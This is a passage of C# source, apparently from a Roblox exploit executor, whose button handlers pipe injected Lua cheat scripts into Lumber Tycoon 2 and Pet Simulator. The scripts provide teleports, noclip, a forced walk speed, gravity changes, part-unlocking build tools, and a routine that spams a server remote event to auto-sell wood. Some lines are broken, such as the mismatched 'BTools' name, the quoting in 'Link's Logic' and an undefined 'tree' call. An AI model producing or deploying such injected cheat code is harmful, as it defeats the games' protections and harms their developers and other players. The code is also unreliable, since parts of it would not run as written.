30)\nNoclip.Font = Enum.Font.Cartoon\nNoclip.Text = 'Noclip [B]'\nNoclip.TextColor3 = Color3.new(0, 0, 0)\nNoclip.TextScaled = true\nNoclip.TextSize = 14\nNoclip.TextWrapped = true\nNoclip.MouseButton1Down:connect(function()\n\t\n\tlocal noclipplayer = game:GetService('Players').LocalPlayer\n\tlocal noclipmouse = noclipplayer:GetMouse()\n\t\n\tlocal donoclip = false\n\tlocal noclip = false\n\t\n\tfunction b_noclip(key)\n\t\tif (key == 'b') then\n\t\t\tif noclip == false then\n\t\t\t\tdonoclip = true\n\t\t\t\t\n\t\t\t\tnoclip = true\n\t\t\telseif noclip == true then\n\t\t\t\tdonoclip = false\n\t\t\t\t\n\t\t\t\tnoclip = false\n\t\t\tend\n\t\tend\n\tend\n\t\n\tnoclipmouse.KeyDown:connect(b_noclip)\n\t\n\tgame:GetService('Players').LocalPlayer.Character.Head.Touched:connect(function(obj)\n\t\tif obj ~= workspace.Terrain then\n\t\t\tif donoclip == true then\n\t\t\t\tobj.CanCollide = false\n\t\t\telse\n\t\t\t\tobj.CanCollide = true\n\t\t\tend\n\t\tend\n\tend)\nend)\nOpen.Name = 'Open'\nOpen.Parent = LT2GUI1\nOpen.BackgroundColor3 = Color3.new(0.819608, 0, 0)\nOpen.Position = UDim2.new(0, 0, 0.699999988, 0)\nOpen.Size = UDim2.new(0, 100, 0, 50)\nOpen.Visible = false\nOpen.Font = Enum.Font.SourceSans\nOpen.Text = 'Open'\nOpen.TextColor3 = Color3.new(0.988235, 0.988235, 0.988235)\nOpen.TextScaled = true\nOpen.TextSize = 14\nOpen.TextWrapped = true\nOpen.MouseButton1Down:connect(function()\n    Open.Visible = false\n    Main.Visible = true\nend)\nend)\n");
      NamedPipes.LuaPipe("-- MADE BY Chaosity Chaosity\nspawn(function()\n\nlocal LT2GUI1 = Instance.new('ScreenGui')\nlocal Main = Instance.new('Frame')\nlocal TOPBAR = Instance.new('Frame')\nlocal Name = Instance.new('TextLabel')\nlocal EXIT = Instance.new('TextButton')\nlocal Cave = Instance.new('TextButton')\nlocal PalmIsland = Instance.new('TextButton')\nlocal Swamp = Instance.new('TextButton')\nlocal Volcano = Instance.new('TextButton')\nlocal LinkLogic = Instance.new('TextButton')\nlocal LandStore = Instance.new('TextButton')\nlocal BobShack = Instance.new('TextButton')\nlocal WoodRUs = Instance.new('TextButton')\nlocal Dock = Instance.new('TextButton')\nlocal BoxedCars = Instance.new('TextButton')\nlocal TPPLOT = Instance.new('TextButton')\nlocal BringWood = Instance.new('TextButton')\nlocal BSellChoppedWood = Instance.new('TextButton')\nlocal BTPCutLogs = Instance.new('TextButton')\nlocal BPhantomWood = Instance.new('TextButton')\nlocal TPNAME = Instance.new('TextLabel')\nlocal FUNCNAME = Instance.new('TextLabel')\nlocal BRejoinServer = Instance.new('TextButton')\nlocal DISCO = Instance.new('TextLabel')\nlocal Walkspeed = Instance.new('TextButton')\nlocal Gravity = Instance.new('TextButton')\nlocal Btools = Instance.new('TextButton')\nlocal Noclip = Instance.new('TextButton')\nlocal Open = Instance.new('TextButton')\n--Properties:\nLT2GUI1.Name = 'LT2GUI  1'\nLT2GUI1.Parent = game.Players.LocalPlayer:WaitForChild('PlayerGui')\n\nMain.Name = 'Main'\nMain.Parent = LT2GUI1\nMain.BackgroundColor3 = Color3.new(0.364706, 0.364706, 0.364706)\nMain.Position = UDim2.new(0.300000012, 0, 0.30399999, 0)\nMain.Size = UDim2.new(0, 450, 0, 300)\nMain.Active = true\nMain.Draggable = true\n\nTOPBAR.Name = 'TOPBAR'\nTOPBAR.Parent = Main\nTOPBAR.BackgroundColor3 = Color3.new(0.815686, 0, 0)\nTOPBAR.Position = UDim2.new(0, 0, -0.129999995, 0)\nTOPBAR.Size = UDim2.new(0, 450, 0, 39)\n\nName.Name = 'Name'\nName.Parent = TOPBAR\nName.BackgroundColor3 = Color3.new(1, 1, 1)\nName.BackgroundTransparency = 1\nName.Size = UDim2.new(0, 382, 0, 39)\nName.Font = Enum.Font.ArialBold\nName.Text = 'Lumber Tycoon 2  V1'\nName.TextColor3 = Color3.new(1, 1, 1)\nName.TextScaled = true\nName.TextSize = 14\nName.TextWrapped = true\n\nEXIT.Name = 'EXIT'\nEXIT.Parent = TOPBAR\nEXIT.BackgroundColor3 = Color3.new(1, 1, 1)\nEXIT.BackgroundTransparency = 1\nEXIT.Position = UDim2.new(0.892499983, 0, 0, 0)\nEXIT.Size = UDim2.new(0, 43, 0, 39)\nEXIT.Font = Enum.Font.SourceSans\nEXIT.Text = 'X'\nEXIT.TextColor3 = Color3.new(0, 0, 0)\nEXIT.TextScaled = true\nEXIT.TextSize = 14\nEXIT.TextWrapped = true\nEXIT.MouseButton1Down:connect(function()\n    Open.Visible = true\n    Main.Visible = false\nend)\nCave.Name = 'Cave'\nCave.Parent = Main\nCave.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nCave.Position = UDim2.new(0.0199999996, 0, 0.306666672, 0)\nCave.Size = UDim2.new(0, 100, 0, 30)\nCave.Font = Enum.Font.Cartoon\nCave.Text = 'Cave'\nCave.TextColor3 = Color3.new(0, 0, 0)\nCave.TextScaled = true\nCave.TextSize = 14\nCave.TextWrapped = true\nCave.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(3581, -179, 430))\nend)\nPalmIsland.Name = 'PalmIsland'\nPalmIsland.Parent = Main\nPalmIsland.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nPalmIsland.Position = UDim2.new(0.0199999996, 0, 0.163333341, 0)\nPalmIsland.Size = UDim2.new(0, 100, 0, 30)\nPalmIsland.Font = Enum.Font.Cartoon\nPalmIsland.Text = 'Palm Island'\nPalmIsland.TextColor3 = Color3.new(0, 0, 0)\nPalmIsland.TextScaled = true\nPalmIsland.TextSize = 14\nPalmIsland.TextWrapped = true\nPalmIsland.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(2549, -5, -42))\nend)\nSwamp.Name = 'Swamp'\nSwamp.Parent = Main\nSwamp.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nSwamp.Position = UDim2.new(0.0199999996, 0, 0.589999974, 0)\nSwamp.Size = UDim2.new(0, 100, 0, 30)\nSwamp.Font = Enum.Font.Cartoon\nSwamp.Text = 'Swamp'\nSwamp.TextColor3 = Color3.new(0, 0, 0)\nSwamp.TextScaled = true\nSwamp.TextSize = 14\nSwamp.TextWrapped = true\nSwamp.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(-1209, 132, -801))\nend)\nVolcano.Name = 'Volcano'\nVolcano.Parent = Main\nVolcano.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nVolcano.Position = UDim2.new(0.0199999996, 0, 0.446666658, 0)\nVolcano.Size = UDim2.new(0, 100, 0, 30)\nVolcano.Font = Enum.Font.Cartoon\nVolcano.Text = 'Volcano'\nVolcano.TextColor3 = Color3.new(0, 0, 0)\nVolcano.TextScaled = true\nVolcano.TextSize = 14\nVolcano.TextWrapped = true\nVolcano.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(-1585, 622, 1140))\nend)\nLinkLogic.Name = 'LinkLogic'\nLinkLogic.Parent = Main\nLinkLogic.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nLinkLogic.Position = UDim2.new(0.264444441, 0, 0.303333342, 0)\nLinkLogic.Size = UDim2.new(0, 100, 0, 30)\nLinkLogic.Font = Enum.Font.Cartoon\nLinkLogic.Text = 'Link's Logic'\nLinkLogic.TextColor3 = Color3.new(0, 0, 0)\nLinkLogic.TextScaled = true\nLinkLogic.TextSize = 14\nLinkLogic.TextWrapped = true\nLinkLogic.TextWrapped = true\nLinkLogic.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(4605, 3, -727))\nend)\nLandStore.Name = 'LandStore'\nLandStore.Parent = Main\nLandStore.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nLandStore.Position = UDim2.new(0.264444441, 0, 0.586666644, 0)\nLandStore.Size = UDim2.new(0, 100, 0, 30)\nLandStore.Font = Enum.Font.Cartoon\nLandStore.Text = 'Land Store'\nLandStore.TextColor3 = Color3.new(0, 0, 0)\nLandStore.TextScaled = true\nLandStore.TextSize = 14\nLandStore.TextWrapped = true\nLandStore.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(258, 3, -99))\nend)\nBobShack.Name = 'BobShack'\nBobShack.Parent = Main\nBobShack.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nBobShack.Position = UDim2.new(0.264444441, 0, 0.160000011, 0)\nBobShack.Size = UDim2.new(0, 100, 0, 30)\nBobShack.Font = Enum.Font.Cartoon\nBobShack.Text = 'Bob's Shack'\nBobShack.TextColor3 = Color3.new(0, 0, 0)\nBobShack.TextScaled = true\nBobShack.TextSize = 14\nBobShack.TextWrapped = true\nBobShack.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(260, 8, -2542))\nend)\nWoodRUs.Name = 'WoodRUs'\nWoodRUs.Parent = Main\nWoodRUs.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nWoodRUs.Position = UDim2.new(0.264444441, 0, 0.443333328, 0)\nWoodRUs.Size = UDim2.new(0, 100, 0, 30)\nWoodRUs.Font = Enum.Font.Cartoon\nWoodRUs.Text = 'Wood R Us'\nWoodRUs.TextColor3 = Color3.new(0, 0, 0)\nWoodRUs.TextScaled = true\nWoodRUs.TextSize = 14\nWoodRUs.TextWrapped = true\nWoodRUs.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(265, 3, 57))\nend)\nDock.Name = 'Dock'\nDock.Parent = Main\nDock.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nDock.Position = UDim2.new(0.0199999996, 0, 0.73333329, 0)\nDock.Size = UDim2.new(0, 100, 0, 30)\nDock.Font = Enum.Font.Cartoon\nDock.Text = 'Dock'\nDock.TextColor3 = Color3.new(0, 0, 0)\nDock.TextScaled = true\nDock.TextSize = 14\nDock.TextWrapped = true\nDock.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(1114, -1, -197))\nend)\nBoxedCars.Name = 'BoxedCars'\nBoxedCars.Parent = Main\nBoxedCars.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nBoxedCars.Position = UDim2.new(0.264444441, 0, 0.729999959, 0)\nBoxedCars.Size = UDim2.new(0, 100, 0, 30)\nBoxedCars.Font = Enum.Font.Cartoon\nBoxedCars.Text = 'Boxed Cars'\nBoxedCars.TextColor3 = Color3.new(0, 0, 0)\nBoxedCars.TextScaled = true\nBoxedCars.TextSize = 14\nBoxedCars.TextWrapped = true\nBoxedCars.MouseButton1Down:connect(function()\n\tgame:GetService('Players').LocalPlayer.Character:MoveTo(Vector3.new(509, 3, -1463))\nend)\nTPPLOT.Name = 'TPPLOT'\nTPPLOT.Parent = Main\nTPPLOT.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nTPPLOT.Position = UDim2.new(0.0199999996, 0, 0.870000005, 0)\nTPPLOT.Size = UDim2.new(0, 210, 0, 30)\nTPPLOT.Font = Enum.Font.Cartoon\nTPPLOT.Text = 'Teleport To Your Plot'\nTPPLOT.TextColor3 = Color3.new(0, 0, 0)\nTPPLOT.TextScaled = true\nTPPLOT.TextSize = 14\nTPPLOT.TextWrapped = true\nTPPLOT.MouseButton1Down:connect(function()\n\tfor i, v in pairs(game.Workspace.Properties:GetChildren()) do\n\t\tif v.Owner.Value == game.Players.LocalPlayer then\n\t\t\tgame.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.OriginSquare.CFrame\n\t\tend\n\tend\nend)\nBringWood.Name = 'BringWood'\nBringWood.Parent = Main\nBringWood.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nBringWood.Position = UDim2.new(0.539166689, 0, 0.589999974, 0)\nBringWood.Size = UDim2.new(0, 100, 0, 30)\nBringWood.Font = Enum.Font.Cartoon\nBringWood.Text = 'Bring Wood'\nBringWood.TextColor3 = Color3.new(0, 0, 0)\nBringWood.TextScaled = true\nBringWood.TextSize = 14\nBringWood.TextWrapped = true\nBringWood.MouseButton1Down:connect(function()\n\tfor _, Log in pairs(game.Workspace.LogModels:GetChildren()) do\n\t\tif Log.Name:sub(1, 6) == 'Loose_' and Log:findFirstChild('Owner') and Log.Owner.Value == game.Players.LocalPlayer then\n\t\t\tLog:MoveTo(game.Players.LocalPlayer.Character.Torso.Position + Vector3.new(0, 10, 0))\n\t\tend\n\tend\nend)\nBSellChoppedWood.Name = 'BSellChoppedWood'\nBSellChoppedWood.Parent = Main\nBSellChoppedWood.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nBSellChoppedWood.Position = UDim2.new(0.539166689, 0, 0.160000011, 0)\nBSellChoppedWood.Size = UDim2.new(0, 100, 0, 30)\nBSellChoppedWood.Font = Enum.Font.Cartoon\nBSellChoppedWood.Text = 'Sell Chopped Wood'\nBSellChoppedWood.TextColor3 = Color3.new(0, 0, 0)\nBSellChoppedWood.TextScaled = true\nBSellChoppedWood.TextSize = 14\nBSellChoppedWood.TextWrapped = true\nBSellChoppedWood.MouseButton1Click:connect(function()\n\t\tfor _, Log in pairs(workspace.LogModels:GetChildren()) do\n\t\tif Log.Name:sub(1, 6) == 'Loose_' and Log:findFirstChild('Owner') then\n\t\t\tif Log.Owner.Value == game.Players.LocalPlayer then\n\t\t\t\tfor i,v in pairs(Log:GetChildren()) do\n\t\t\t\t\tif v.Name=='WoodSection' then\n\t\t\t\t\t\tspawn(function()\n\t\t\t\t\t\t\tfor i=1,10 do\n\t\t\t\t\t\t\t\twait()\n\t\t\t\t\t\t\t\tv.CFrame=CFrame.new(Vector3.new(315, -0.296, 85.791))*CFrame.Angles(math.rad(90),0,0)\n\t\t\t\t\t\t\tend\n\t\t\t\t\t\tend)\n\t\t\t\t\tend\n\t\t\t\tend\n\t\t\t\tspawn(function()\n\t\t\t\t\tfor i=1,20 do\n\t\t\t\t\t\twait()\n\t\t\t\t\t\tgame.ReplicatedStorage.Interaction.ClientIsDragging:FireServer(Log)\n\t\t\t\t\tend\n\t\t\t\tend)\n\t\t\tend\n\t\tend\n\tend\nend)\nBTPCutLogs.Name = 'BTPCutLogs'\nBTPCutLogs.Parent = Main\nBTPCutLogs.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nBTPCutLogs.Position = UDim2.new(0.539166689, 0, 0.306666672, 0)\nBTPCutLogs.Size = UDim2.new(0, 100, 0, 30)\nBTPCutLogs.Font = Enum.Font.Cartoon\nBTPCutLogs.Text = 'Teleport Cut Logs To You'\nBTPCutLogs.TextColor3 = Color3.new(0, 0, 0)\nBTPCutLogs.TextScaled = true\nBTPCutLogs.TextSize = 14\nBTPCutLogs.TextWrapped = true\nBTPCutLogs.MouseButton1Click:connect(function()\n\tfor _, Log in pairs(game.Workspace.LogModels:GetChildren()) do\nif Log.Name:sub(1, 6) == 'Loose_' and Log:findFirstChild('Owner') then\nif Log.Owner.Value == game.Players.LocalPlayer then\nLog:MoveTo(game.Players.LocalPlayer.Character.Torso.Position + Vector3.new(0, 15, 0))\nend\nend\nend\nend)\nBPhantomWood.Name = 'BPhantomWood'\nBPhantomWood.Parent = Main\nBPhantomWood.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nBPhantomWood.Position = UDim2.new(0.539166689, 0, 0.446666658, 0)\nBPhantomWood.Size = UDim2.new(0, 100, 0, 30)\nBPhantomWood.Font = Enum.Font.Cartoon\nBPhantomWood.Text = 'Teleport Cavecrawler Wood'\nBPhantomWood.TextColor3 = Color3.new(0, 0, 0)\nBPhantomWood.TextScaled = true\nBPhantomWood.TextSize = 14\nBPhantomWood.TextWrapped = true\nBPhantomWood.MouseButton1Down:connect(function()\nfor i, v in pairs(game.Workspace:GetChildren()) do\nif v.Name == 'TreeRegion' then\nfor a, b in pairs(v:GetChildren()) do\ntree(b, 'CaveCrawler')\nend\nend\nend\nend)\nTPNAME.Name = 'TPNAME'\nTPNAME.Parent = Main\nTPNAME.BackgroundColor3 = Color3.new(1, 1, 1)\nTPNAME.BackgroundTransparency = 1\nTPNAME.Position = UDim2.new(0.0199999996, 0, 0, 0)\nTPNAME.Size = UDim2.new(0, 220, 0, 42)\nTPNAME.Font = Enum.Font.SourceSans\nTPNAME.Text = 'Teleports'\nTPNAME.TextColor3 = Color3.new(1, 1, 1)\nTPNAME.TextScaled = true\nTPNAME.TextSize = 14\nTPNAME.TextWrapped = true\n\nFUNCNAME.Name = 'FUNCNAME'\nFUNCNAME.Parent = Main\nFUNCNAME.BackgroundColor3 = Color3.new(1, 1, 1)\nFUNCNAME.BackgroundTransparency = 1\nFUNCNAME.Position = UDim2.new(0.540000021, 0, 0, 0)\nFUNCNAME.Size = UDim2.new(0, 202, 0, 42)\nFUNCNAME.Font = Enum.Font.SourceSans\nFUNCNAME.Text = 'Functions'\nFUNCNAME.TextColor3 = Color3.new(1, 1, 1)\nFUNCNAME.TextScaled = true\nFUNCNAME.TextSize = 14\nFUNCNAME.TextWrapped = true\n\nBRejoinServer.Name = 'BRejoinServer'\nBRejoinServer.Parent = Main\nBRejoinServer.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nBRejoinServer.Position = UDim2.new(0.540000021, 0, 0.733333349, 0)\nBRejoinServer.Size = UDim2.new(0, 207, 0, 30)\nBRejoinServer.Font = Enum.Font.Cartoon\nBRejoinServer.Text = 'Rejoin Server'\nBRejoinServer.TextColor3 = Color3.new(0, 0, 0)\nBRejoinServer.TextScaled = true\nBRejoinServer.TextSize = 14\nBRejoinServer.TextWrapped = true\nBRejoinServer.MouseButton1Down:connect(function()\nlocal placeId = 13822889\n\ngame:GetService('TeleportService'):Teleport(placeId)\nend)\nDISCO.Name = 'DISCO'\nDISCO.Parent = Main\nDISCO.BackgroundColor3 = Color3.new(1, 1, 1)\nDISCO.BackgroundTransparency = 1\nDISCO.Position = UDim2.new(0.540000021, 0, 0.850000024, 0)\nDISCO.Size = UDim2.new(0, 202, 0, 42)\nDISCO.Font = Enum.Font.SourceSans\nDISCO.Text = 'Made By Chaosity    Discord:  https://discord.gg/DEVYCQp'\nDISCO.TextColor3 = Color3.new(1, 1, 1)\nDISCO.TextScaled = true\nDISCO.TextSize = 14\nDISCO.TextWrapped = true\n\nWalkspeed.Name = 'Walkspeed'\nWalkspeed.Parent = Main\nWalkspeed.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nWalkspeed.Position = UDim2.new(0.776944458, 0, 0.160000011, 0)\nWalkspeed.Size = UDim2.new(0, 100, 0, 30)\nWalkspeed.Font = Enum.Font.Cartoon\nWalkspeed.Text = 'Walkspeed[X]'\nWalkspeed.TextColor3 = Color3.new(0, 0, 0)\nWalkspeed.TextScaled = true\nWalkspeed.TextSize = 14\nWalkspeed.TextWrapped = true\nWalkspeed.MouseButton1Down:connect(function()\n\tlocal walkspeedplayer = game:GetService('Players').LocalPlayer\n\tlocal walkspeedmouse = walkspeedplayer:GetMouse()\n\t\n\tlocal walkspeedenabled = false\n\t\n\tfunction x_walkspeed(key)\n\t\tif (key == 'x') then\n\t\t\tif walkspeedenabled == false then\n\t\t\t\t_G.WS = 200;\n\t\t\t\tlocal Humanoid = game:GetService('Players').LocalPlayer.Character.Humanoid;\n\t\t\t\tHumanoid:GetPropertyChangedSignal('WalkSpeed'):Connect(function()\n\t\t\t\tHumanoid.WalkSpeed = _G.WS;\n\t\t\t\tend)\n\t\t\t\tHumanoid.WalkSpeed = _G.WS;\n\t\t\t\t\n\t\t\t\twalkspeedenabled = true\n\t\t\telseif walkspeedenabled == true then\n\t\t\t\t_G.WS = 20;\n\t\t\t\tlocal Humanoid = game:GetService('Players').LocalPlayer.Character.Humanoid;\n\t\t\t\tHumanoid:GetPropertyChangedSignal('WalkSpeed'):Connect(function()\n\t\t\t\tHumanoid.WalkSpeed = _G.WS;\n\t\t\t\tend)\n\t\t\t\tHumanoid.WalkSpeed = _G.WS;\n\t\t\t\t\n\t\t\t\twalkspeedenabled = false\n\t\t\tend\n\t\tend\n\tend\n\t\n\twalkspeedmouse.KeyDown:connect(x_walkspeed)\n\t\nend)\nGravity.Name = 'Gravity'\nGravity.Parent = Main\nGravity.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nGravity.Position = UDim2.new(0.776944458, 0, 0.303333342, 0)\nGravity.Size = UDim2.new(0, 100, 0, 30)\nGravity.Font = Enum.Font.Cartoon\nGravity.Text = 'Gravity'\nGravity.TextColor3 = Color3.new(0, 0, 0)\nGravity.TextScaled = true\nGravity.TextSize = 14\nGravity.TextWrapped = true\nGravity.MouseButton1Down:connect(function()\nif Gravity == true then\nGravity = false\ngame.workspace.Gravity = 196.2\nelse\nGravity = true\ngame.workspace.Gravity = 45\nend\nend)\nBtools.Name = 'Btools'\nBtools.Parent = Main\nBtools.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nBtools.Position = UDim2.new(0.776944458, 0, 0.443333328, 0)\nBtools.Size = UDim2.new(0, 100, 0, 30)\nBtools.Font = Enum.Font.Cartoon\nBtools.Text = 'Btools'\nBtools.TextColor3 = Color3.new(0, 0, 0)\nBtools.TextScaled = true\nBtools.TextSize = 14\nBtools.TextWrapped = true\nBTools.MouseButton1Down:connect(function()\n\tgame.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)\nfor index, child in pairs(game:GetService('Workspace'):GetChildren()) do\n   if child.ClassName == 'Part' then\n       child.Locked = false\n   end\n   if child.ClassName == 'MeshPart' then\n       child.Locked = false\n   end\n   if child.ClassName == 'UnionOperation' then\n       child.Locked = false\n   end\n   if child.ClassName == 'Model' then\n       for index, chil in pairs(child:GetChildren()) do\n           if chil.ClassName == 'Part' then\n               chil.Locked = false\n           end\n           if chil.ClassName == 'MeshPart' then\n               chil.Locked = false\n           end\n           if chil.ClassName == 'UnionOperation' then\n               chil.Locked = false\n           end\n           if chil.ClassName == 'Model' then\n               for index, childe in pairs(chil:GetChildren()) do\n                   if childe.ClassName == 'Part' then\n                       childe.Locked = false\n                   end\n                   if childe.ClassName == 'MeshPart' then\n                       childe.Locked = false\n                   end\n                   if childe.ClassName == 'UnionOperation' then\n                       childe.Locked = false\n                   end\n                   if childe.ClassName == 'Model' then\n                       for index, childeo in pairs(childe:GetChildren()) do\n                           if childeo.ClassName == 'Part' then\n                               childeo.Locked = false\n                           end\n                           if childeo.ClassName == 'MeshPart' then\n                               childeo.Locked = false\n                           end\n                           if childeo.ClassName == 'UnionOperation' then\n                               childeo.Locked = false\n                           end\n                           if childeo.ClassName == 'Model' then\n                           end\n                       end\n                   end\n               end\n           end\n       end\n   end\nend\nc = Instance.new('HopperBin', game:GetService('Players').LocalPlayer.Backpack)\nc.BinType = Enum.BinType.Hammer\nc = Instance.new('HopperBin', game:GetService('Players').LocalPlayer.Backpack)\nc.BinType = Enum.BinType.Clone\nc = Instance.new('HopperBin', game:GetService('Players').LocalPlayer.Backpack)\nc.BinType = Enum.BinType.Grab\nend)\nNoclip.Name = 'Noclip'\nNoclip.Parent = Main\nNoclip.BackgroundColor3 = Color3.new(0.776471, 0, 0)\nNoclip.Position = UDim2.new(0.776944458, 0, 0.586666644, 0)\nNoclip.Size = UDim2.new(0, 100, 0, 30)\nNoclip.Font = Enum.Font.Cartoon\nNoclip.Text = 'Noclip [B]'\nNoclip.TextColor3 = Color3.new(0, 0, 0)\nNoclip.TextScaled = true\nNoclip.TextSize = 14\nNoclip.TextWrapped = true\nNoclip.MouseButton1Down:connect(function()\n\t\n\tlocal noclipplayer = game:GetService('Players').LocalPlayer\n\tlocal noclipmouse = noclipplayer:GetMouse()\n\t\n\tlocal donoclip = false\n\tlocal noclip = false\n\t\n\tfunction b_noclip(key)\n\t\tif (key == 'b') then\n\t\t\tif noclip == false then\n\t\t\t\tdonoclip = true\n\t\t\t\t\n\t\t\t\tnoclip = true\n\t\t\telseif noclip == true then\n\t\t\t\tdonoclip = false\n\t\t\t\t\n\t\t\t\tnoclip = false\n\t\t\tend\n\t\tend\n\tend\n\t\n\tnoclipmouse.KeyDown:connect(b_noclip)\n\t\n\tgame:GetService('Players').LocalPlayer.Character.Head.Touched:connect(function(obj)\n\t\tif obj ~= workspace.Terrain then\n\t\t\tif donoclip == true then\n\t\t\t\tobj.CanCollide = false\n\t\t\telse\n\t\t\t\tobj.CanCollide = true\n\t\t\tend\n\t\tend\n\tend)\nend)\nOpen.Name = 'Open'\nOpen.Parent = LT2GUI1\nOpen.BackgroundColor3 = Color3.new(0.819608, 0, 0)\nOpen.Position = UDim2.new(0, 0, 0.699999988, 0)\nOpen.Size = UDim2.new(0, 100, 0, 50)\nOpen.Visible = false\nOpen.Font = Enum.Font.SourceSans\nOpen.Text = 'Open'\nOpen.TextColor3 = Color3.new(0.988235, 0.988235, 0.988235)\nOpen.TextScaled = true\nOpen.TextSize = 14\nOpen.TextWrapped = true\nOpen.MouseButton1Down:connect(function()\n    Open.Visible = false\n    Main.Visible = true\nend)\nend)\n");
    }

    private void flatButton280_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local PetSimulator = Instance.new('ScreenGui')\nlocal Main         = Instance.new('Frame')\nlocal Title        = Instance.new('TextButton')\nlocal Place1       = Instance.new('TextButton')\nlocal Place2       = Instance.new('TextButton')\nlocal Place3       = Instance.new('TextButton')\nlocal Place4       = Instance.new('TextButton')\nlocal Place5       = Instance.new('TextButton')\nlocal Store        = Instance.new('TextButton')\nlocal Spawn        = Instance.new('TextButton')\nlocal Credits      = Instance.new('TextButton')\n\nPetSimulator.Name = 'PetSimulator'\nPetSimulator.Parent = game.Players.LocalPlayer:WaitForChild('PlayerGui')\n\nMain.Name = 'Main'\nMain.Parent = PetSimulator\nMain.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)\nMain.BackgroundTransparency = 0.15000000596046\nMain.BorderColor3 = Color3.new(1, 1, 1)\nMain.BorderSizePixel = 0\nMain.Position = UDim2.new(0.841656327, 0, 0.483282685, 0)\nMain.Size = UDim2.new(0, 172, 0, 333)\n\nTitle.Name = 'Title'\nTitle.Parent = Main\nTitle.BackgroundColor3 = Color3.new(0.0156863, 0.0156863, 0.0156863)\nTitle.BorderSizePixel = 0\nTitle.Position = UDim2.new(-0.133720934, 0, -0.0600600615, 0)\nTitle.Size = UDim2.new(0, 217, 0, 20)\nTitle.Font = Enum.Font.SciFi\nTitle.Text = 'Teleports'\nTitle.TextColor3 = Color3.new(0.980392, 0.980392, 0.980392)\nTitle.TextSize = 16\n\nPlace1.Name = 'Place1'\nPlace1.Parent = Main\nPlace1.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)\nPlace1.BorderColor3 = Color3.new(1, 1, 1)\nPlace1.Position = UDim2.new(0.0581395365, 0, 0.0360360369, 0)\nPlace1.Size = UDim2.new(0, 151, 0, 32)\nPlace1.Font = Enum.Font.SourceSans\nPlace1.Text = 'Place [1]'\nPlace1.TextColor3 = Color3.new(1, 1, 1)\nPlace1.TextSize = 14\nPlace1.MouseButton1Down:connect(function()\ngame.Players.LocalPlayer.Character:MoveTo(Vector3.new(0.295806587, -37.0378761, 890.214355))\nend)\n\nPlace2.Name = 'Place2'\nPlace2.Parent = Main\nPlace2.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)\nPlace2.BorderColor3 = Color3.new(1, 1, 1)\nPlace2.Position = UDim2.new(0.0581395365, 0, 0.15015015, 0)\nPlace2.Size = UDim2.new(0, 151, 0, 32)\nPlace2.Font = Enum.Font.SourceSans\nPlace2.Text = 'Place [2]'\nPlace2.TextColor3 = Color3.new(1, 1, 1)\nPlace2.TextSize = 14\nPlace2.MouseButton1Down:connect(function()\ngame.Players.LocalPlayer.Character:MoveTo(Vector3.new(-374.2388, -37.0378761, 885.253296))\nend)\n\nPlace3.Name = 'Place3'\nPlace3.Parent = Main\nPlace3.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)\nPlace3.BorderColor3 = Color3.new(1, 1, 1)\nPlace3.Position = UDim2.new(0.0581395365, 0, 0.264264286, 0)\nPlace3.Size = UDim2.new(0, 151, 0, 32)\nPlace3.Font = Enum.Font.SourceSans\nPlace3.Text = 'Place [3]'\nPlace3.TextColor3 = Color3.new(1, 1, 1)\nPlace3.TextSize = 14\nPlace3.MouseButton1Down:connect(function()\ngame.Players.LocalPlayer.Character:MoveTo(Vector3.new(-760.199097, -37.0378761, 880.302246))\nend)\n\nPlace4.Name = 'Place4'\nPlace4.Parent = Main\nPlace4.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)\nPlace4.BorderColor3 = Color3.new(1, 1, 1)\nPlace4.Position = UDim2.new(0.0581395365, 0, 0.378378391, 0)\nPlace4.Size = UDim2.new(0, 151, 0, 32)\nPlace4.Font = Enum.Font.SourceSans\nPlace4.Text = 'Place [4]'\nPlace4.TextColor3 = Color3.new(1, 1, 1)\nPlace4.TextSize = 14\nPlace4.MouseButton1Down:connect(function()\ngame.Players.LocalPlayer.Character:MoveTo(Vector3.new(-1140.22437, -37.0378761, 885.195129))\nend)\n\nPlace5.Name = 'Place5'\nPlace5.Parent = Main\nPlace5.BackgroundColor3 = Color3.new(0.0784314, 0.0784314, 0.0784314)\nPlace5.BorderColor3 = Color3.new(1, 1, 1)\nPlace5.Position = UDim2.new(0.0581395365, 0, 0.492492497, 0)\nPlace5.Size = UDim2.new(0, 151, 0, 